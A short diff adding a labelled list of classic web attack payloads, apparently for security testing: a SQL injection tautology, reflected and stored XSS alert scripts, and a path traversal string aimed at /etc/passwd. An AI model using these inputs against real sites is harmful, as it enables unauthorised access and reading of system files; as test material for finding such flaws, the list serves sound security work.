@@ -1,1 +1,11 @@
+SQL Injection:
+' OR '1'='1
 
+Reflected XSS:
+<script>alert('XSS')</script>
+
+Stored XSS:
+<script>alert('Stored XSS')</script>
+
+File Inclusion:
+../../../../etc/passwd
